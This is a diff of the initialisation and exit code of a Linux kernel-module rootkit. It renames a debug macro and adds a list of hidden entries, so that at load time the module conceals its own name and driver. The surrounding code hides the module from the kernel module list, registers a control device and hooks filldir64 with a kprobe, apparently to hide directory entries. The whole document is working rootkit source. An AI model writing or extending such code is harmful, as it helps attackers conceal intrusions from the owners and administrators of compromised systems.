@@ -12,11 +12,11 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 
+#include "../include/debug.h"
+
 #include "include/driver.h"
 #include "include/hide.h"
 #include "include/kprobe.h"
-
-#include "../include/debug.h"
 
 // Define the license and other module information
 MODULE_LICENSE("GPL");
@@ -34,31 +34,38 @@ MODULE_VERSION("0.1.0");
  */
 static int __init mod_init(void)
 {
-    RKT_DEBUG("LKM rootkit loaded\n");
+    RTK_DEBUG("LKM rootkit loaded\n");
 
     hide(); // Hide the rootkit from the kernel module list by default
 
     if (misc_register(&rk_miscdevice) < 0)
     {
-        RKT_DEBUG("Failed to register the rootkit device driver\n");
+        RTK_DEBUG("Failed to register the rootkit device driver\n");
         return -1;
     }
 
-    RKT_DEBUG("Rootkit device driver registered\n");
+    RTK_DEBUG("Rootkit device driver registered\n");
+
+    init_hidden_list();
+    RTK_DEBUG("Hidden list initialized\n");
+
+    // Hide default entries
+    add_hidden_entry(RK_NAME);
+    add_hidden_entry(RK_DRIVER);
 
     kp.pre_handler = handler_pre;
 
     if (register_kprobe(&kp) < 0)
     {
-        RKT_DEBUG("Failed to register the kprobe\n");
+        RTK_DEBUG("Failed to register the kprobe\n");
         return -1;
     }
 
-    RKT_DEBUG("Kprobe registered\n");
-    RKT_DEBUG("filldir64: at %px\n", kp.addr);
-    RKT_DEBUG("handler_pre: %px\n", handler_pre);
+    RTK_DEBUG("Kprobe registered\n");
+    RTK_DEBUG("filldir64: at %px\n", kp.addr);
+    RTK_DEBUG("handler_pre: %px\n", handler_pre);
 
-    RKT_DEBUG("Rootkit initialized\n");
+    RTK_DEBUG("Rootkit initialized\n");
 
     return 0;
 }
@@ -72,12 +79,15 @@ static int __init mod_init(void)
 static void __exit mod_exit(void)
 {
     unregister_kprobe(&kp);
-    RKT_DEBUG("Kprobe unregistered\n");
+    RTK_DEBUG("Kprobe unregistered\n");
 
     misc_deregister(&rk_miscdevice);
-    RKT_DEBUG("Rootkit device driver unregistered\n");
+    RTK_DEBUG("Rootkit device driver unregistered\n");
 
-    RKT_DEBUG("Rootkit unloaded\n");
+    cleanup_hidden_list();
+    RTK_DEBUG("Hidden processes cleaned up\n");
+
+    RTK_DEBUG("Rootkit unloaded\n");
 }
 
 // Register the module initialization and exit functions
